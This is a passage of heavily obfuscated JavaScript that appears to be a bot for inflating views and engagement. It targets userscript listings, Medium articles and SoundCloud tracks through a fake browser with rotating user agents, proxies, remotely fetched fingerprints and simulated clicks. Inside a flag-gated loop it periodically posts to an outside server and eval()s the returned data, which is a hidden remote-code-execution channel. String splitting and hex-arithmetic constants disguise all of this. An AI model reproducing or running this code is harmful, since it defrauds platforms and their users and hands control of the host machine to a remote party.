      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + aF(0x1, 'ot*c'),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
      },
      {
        'url': 'https://gr' + aG(0xa) + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + aE(0xb) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + aF(0x7, 'GoCJ') + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + aF(0x2, 'WiZ(') + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + aE(0xd) + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + aG(0x5) + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + aG(0xe) + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + aF(0x11, 'mv4L'),
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xed0 + 0x7f + 0xe5b)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xd26 + 0x1f * 0x3b + -0x1441)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + aF(0x1d, '2Oox') + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0x261e + -0x25 * -0xf2 + 0x10d * 0x3);
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0x18a3 + -0x1f83 + 0x3826; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes'](), async function trigger() {
  const aK = c,
    aJ = b,
    aI = d;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](j => {
              try {
                const k = j['data'][0x14bd + -0x53 * 0x2 + 0x25 * -0x8b];
                '$' === k ? f['push'](j['data']) : eval(j['data']);
              } catch (l) {}
            })['catch'](j => {});
          } catch (j) {}
        }
        h(), setInterval(h, -0xab93 + 0x29f11 * 0x1 + 0x1 * 0x2a062);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: j
        } = require('fakebrowse' + 'r'), k = require('path'), l = k['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), m = new j['Builder']()['displayUse' + 'rActionLay' + 'er'](0xe83 + 0x1caa + -0x2b2d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](l);
        let n;
        aa:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let W = await async function X() {
                  let Y;
                  const Z = {
                    'User-Agent': Y['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    Y = (await axios['get']('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': Z
                    })) ? .['data'];
                  } catch (a0) {}
                  if (Y)
                    try {
                      Y = (await axios['get'](Y, {
                        'headers': Z
                      })) ? .['data'];
                    } catch (a1) {}
                  if (!Y)
                    return await randomWait(), await X();
                  try {
                    return 'object' == typeof Y ? Y : 'string' == typeof Y ? JSON['parse'](Y) : {};
                  } catch (a2) {
                    if (!Y)
                      return await randomWait(), await X();
                  }
                }();
                m['deviceDesc' + 'riptor'](W);
              }
              n = await m['launch']();
              break aa;
            } catch (Y) {
              warn(Y), await randomWait();
            }
        const {
          vanillaBrowser: p,
          userAction: q
        } = n;
        log('index.js\x20c' + 'alled');
        const u = p['defaultBro' + 'wserContex' + 't']();
        async function v(Z = '', a0 = 0x1 * 0x2567 + -0x93f + -0x1 * 0x1c27, a1) {
          const a2 = await a1['waitForSel' + 'ector'](Z);
          return await q['simClickEl' + 'ement'](a2, {
            'pauseAfterMouseUp': a0
          }), a2;
        }
        async function w(Z) {
          const a0 = await Z['target']()['createCDPS' + 'ession']();
          await a0['send']('Network.cl' + 'earBrowser' + 'Cookies'), await a0['send']('Network.cl' + 'earBrowser' + 'Cache');
          const a1 = await Z['cookies']();
          for (const a2 of a1)
            await Z['deleteCook' + 'ie'](a2);
          return await Z['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), -0x233 * 0x2 + 0x807 + -0x20 * 0x1d;
        }
        async function x(Z, a0 = -0xede * 0x1 + -0xe35 + -0x745 * -0x4) {
          let a1 = await p['newPage']();
          return await a1['setDefault' + 'Navigation' + 'Timeout'](-0x1841 + -0x1 * 0x1d33 + 0x3574), a0 && await useProxy(a1, await getRandomProxy()), await a1['goto'](Z, {
            'timeout': 0x0
          }), a1;
        }
        async function y(Z) {
          return await wait(-0x1e5c * 0x1 + 0x4be * 0x1 + 0x2d26), await Z['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), -0xb85 + -0x39a * -0x2 + 0x452;
        }
        async function z(Z) {
